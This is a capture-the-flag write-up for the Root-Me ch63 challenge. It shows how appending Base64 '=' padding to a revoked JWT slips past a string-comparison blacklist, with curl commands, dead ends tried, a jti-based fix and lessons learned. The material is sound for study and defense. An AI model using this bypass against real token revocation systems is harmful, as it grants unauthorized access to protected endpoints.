# Root-Me Ch63: JWT Blacklist Bypass

## Challenge Overview

| | |
|---|---|
| **Platform** | Root-Me |
| **Category** | Web Server |
| **Challenge** | ch63 |
| **Difficulty** | Medium |
| **Vulnerability** | JWT Blacklist Bypass via Base64 Padding |

Two endpoints are available:

```
POST /web-serveur/ch63/login
GET  /web-serveur/ch63/admin
```

**Goal:** Access the `/admin` endpoint and retrieve the flag.

---

## Understanding the Source Code

### Authentication Flow

The login endpoint accepts `admin/admin` credentials and returns a JWT with a **3-minute expiry**:

```python
access_token = create_access_token(
    identity=username,
    expires_delta=datetime.timedelta(minutes=3)
)
```

But immediately after creating the token, it gets **blacklisted**:

```python
with lock:
    blacklist.add(access_token)
```

> Every token you receive from `/login` is instantly revoked.

### The Blacklist Check

```python
@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg": "Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
```

The check does a **strict string comparison** between the token in the `Authorization` header and the tokens stored in the blacklist `set()`.

---

## Dead Ends

### ❌ 1. Uppercase Token

Sending the token with uppercase characters returns:

```json
{"msg": "Invalid header string: Expecting value: line 1 column 1 (char 0)"}
```

`flask_jwt_extended` rejects the token before it even reaches the blacklist check.

---

### ❌ 2. Scheduler Race Condition

The app runs a background thread every 10 seconds to clean expired tokens from the blacklist:

```python
def delete_expired_tokens():
    with lock:
        to_remove = set()
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'], algorithm='HS256')
            except:
                to_remove.add(access_token)
        blacklist = blacklist.difference(to_remove)
```

**Theory:** Wait for the scheduler to remove the token from the blacklist, then hit `/admin` before it expires.

```
0s    → login, token blacklisted
10s   → scheduler runs, removes expired tokens from blacklist
180s  → token expires

Hit /admin between 10s: 180s → bypass?
```

**Result:** The token remained revoked. The scheduler on the deployed instance either doesn't run reliably, or the `algorithm` (singular) vs `algorithms` (list) PyJWT API mismatch causes the decode to always throw an exception: meaning tokens are never cleaned up.

---

### ❌ 3. Double Space in Authorization Header

```
Authorization: Bearer  TOKEN
```

Python's `.split()` splits on any amount of whitespace, so `split()[1]` still returns the token correctly. No bypass.

---

## The Real Vulnerability: Base64 Padding Bypass

### Background

JWTs are **Base64url encoded**. Base64 uses `=` as a **padding character**. The key property is:

```
eyJhbGc...abc     ← no padding
eyJhbGc...abc=    ← one padding char
eyJhbGc...abc==   ← two padding chars
```

These three strings **decode to identical values**, but as raw strings, they are **completely different**.

### Why This Breaks the Blacklist

```python
# Stored in blacklist (no padding):
"eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MX0.abc"

# Sent in Authorization header (with padding):
"eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MX0.abc="

# The check on line 64:
if access_token in blacklist:  # FALSE → bypass! ✅
```

- `flask_jwt_extended` **validates the token successfully**: it ignores Base64 padding during decoding.
- The **blacklist check fails**: it's a strict string comparison, so `"abc"` ≠ `"abc="`.

### Vulnerability Summary

```
┌─────────────────────────────────────────────────────────┐
│  JWT Validation (flask_jwt_extended)                    │
│  "eyJ...abc"  ==  "eyJ...abc="  ✅ (same decoded value) │
├─────────────────────────────────────────────────────────┤
│  Blacklist Check (Python set)                           │
│  "eyJ...abc"  !=  "eyJ...abc="  ✅ (different strings)  │
└─────────────────────────────────────────────────────────┘
```

---

## Exploitation

**Step 1: Login and get a token:**

```bash
curl -X POST https://www.root-me.org/web-serveur/ch63/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  -b "YOUR_ROOTME_SESSION_COOKIE"
```

Response:
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..."
}
```

**Step 2: Append `=` to the token and hit `/admin`:**

```bash
curl -X GET https://www.root-me.org/web-serveur/ch63/admin \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...=" \
  -b "YOUR_ROOTME_SESSION_COOKIE"
```

**Result:**

```json
{"Congratzzzz!!!_flag:": "FLAG_HERE"}
```

---

## Root Cause

The vulnerability comes from using **raw string equality** for a security-critical comparison on **encoded data**. The blacklist stores the token exactly as returned by `create_access_token()`, but Base64 padding variants of the same token are semantically identical yet string-unequal.

### Fix

Instead of storing and comparing the full raw token string, use the **`jti` claim** (JWT ID) which is padding-independent:

```python
# ✅ Correct approach
from flask_jwt_extended import decode_token

decoded = decode_token(access_token)
jti = decoded["jti"]

# Store jti in blacklist, not the raw token
blacklist.add(jti)

# Check jti on the admin endpoint
if decoded_token["jti"] in blacklist:
    return jsonify({"msg": "Token is revoked"}), 401
```

---

## Lessons Learned

| Concept | Detail |
|---|---|
| **Never compare encoded data as strings** | Base64 padding variants decode identically but differ as strings |
| **Use `jti` for blacklisting** | The JWT spec provides `jti` exactly for this purpose: it's encoding-independent |
| **JWT libraries normalize silently** | `flask_jwt_extended` strips padding before validation, creating a mismatch with raw storage |
| **Hot path checks need correctness** | A blacklist that can be trivially bypassed is worse than no blacklist |
